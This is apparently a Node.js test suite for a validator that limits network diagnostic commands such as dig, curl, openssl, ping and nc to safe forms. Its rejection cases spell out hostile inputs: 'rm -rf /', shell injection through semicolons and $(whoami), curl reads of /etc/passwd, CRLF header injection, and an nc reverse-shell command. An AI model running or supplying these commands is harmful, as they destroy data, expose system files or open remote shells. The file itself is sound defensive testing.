import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validateCommand, ValidationError } from '../src/validator/validate.js';
import { tokenize } from '../src/validator/tokenize.js';

function accepts(line) {
  assert.doesNotThrow(() => validateCommand(line), `expected to accept: ${line}`);
}

function rejects(line) {
  assert.throws(() => validateCommand(line), ValidationError, `expected to reject: ${line}`);
}

test('tokenize handles quotes and leaves metacharacters literal', () => {
  assert.deepEqual(tokenize('curl -H "Content-Type: json" url'), [
    'curl',
    '-H',
    'Content-Type: json',
    'url',
  ]);
  assert.deepEqual(tokenize("dig 'example.com'"), ['dig', 'example.com']);
  assert.deepEqual(tokenize('dig google.com; rm -rf /'), ['dig', 'google.com;', 'rm', '-rf', '/']);
  assert.throws(() => tokenize('curl -H "unterminated'), ValidationError);
});

test('shell metacharacters never gain syntactic meaning', () => {
  rejects('dig google.com; rm -rf /');
  rejects('rm -rf /');
  rejects('dig $(whoami)');
});

test('unknown binaries are rejected outright', () => {
  rejects('bash -c "echo hi"');
  rejects('nmap -sV example.com');
});

test('dig: allowlisted forms', () => {
  accepts('dig example.com');
  accepts('dig @8.8.8.8 example.com A');
  accepts('dig example.com MX +short');
  accepts('dig example.com +dnssec');
  accepts('dig example.com A +dnssec +short');
  accepts('dig example.com A +short +dnssec');
  rejects('dig example.com +trace');
  rejects('dig');
  rejects('dig not a valid host!!');
});

test('whois/host: single validated host', () => {
  accepts('whois example.com');
  rejects('whois example.com extra');
  accepts('host example.com');
  accepts('host example.com 8.8.8.8');
  rejects('host');
});

test('curl: http(s) only, dangerous flags denied by default', () => {
  accepts('curl https://example.com');
  accepts('curl -I -L https://example.com');
  accepts('curl -X POST -d "a=b" https://example.com');
  accepts('curl -X PUT https://example.com');
  accepts('curl -X DELETE https://example.com');
  rejects('curl -X PATCH https://example.com');
  rejects('curl -o /etc/passwd https://example.com');
  rejects('curl file:///etc/passwd');
  rejects('curl gopher://example.com');
  rejects('curl -d @/etc/passwd https://example.com');
  rejects('curl --data-binary @file https://example.com');
  rejects('curl -F file=@x https://example.com');
  rejects('curl -H "X-Evil: a\r\nSet-Cookie: x" https://example.com');
  rejects('curl https://example.com https://other.com');
  accepts('curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" https://example.com -I');
  accepts('curl --user-agent "Mozilla/5.0" https://example.com');
  rejects('curl -A "evil\r\nSet-Cookie: x" https://example.com');
  rejects('curl --user-agent "evil\r\nSet-Cookie: x" https://example.com');
});

test('openssl: only s_client, safe flags, IPv4/hostname/IPv6 targets', () => {
  accepts('openssl s_client -connect example.com:443');
  accepts('openssl s_client -connect 93.184.216.34:443');
  accepts('openssl s_client -connect [::1]:443');
  accepts('openssl s_client -connect [2001:db8::1]:8443 -servername example.com -showcerts');
  rejects('openssl s_client -connect example.com');
  rejects('openssl s_client -connect example.com:99999');
  rejects('openssl s_client -connect [::1]443');
  rejects('openssl x509 -in cert.pem');
  rejects('openssl s_client -connect example.com:443 -cert x.pem');
});

test('mtr: report mode forced, count bounded', () => {
  assert.deepEqual(validateCommand('mtr example.com').args, ['-r', '-c', '5', 'example.com']);
  accepts('mtr -c 10 example.com');
  rejects('mtr -c 11 example.com');
  rejects('mtr -c 0 example.com');
});

test('ping: count bounded, flood/interval denied', () => {
  accepts('ping -c 5 example.com');
  rejects('ping -c 6 example.com');
  rejects('ping -f example.com');
  rejects('ping -i 0.1 example.com');
});

test('nc: only single-port connect-check', () => {
  accepts('nc -zv example.com 443');
  rejects('nc -zv example.com 20-30000');
  rejects('nc -l -p 4444');
  rejects('nc -e /bin/sh example.com 4444');
});
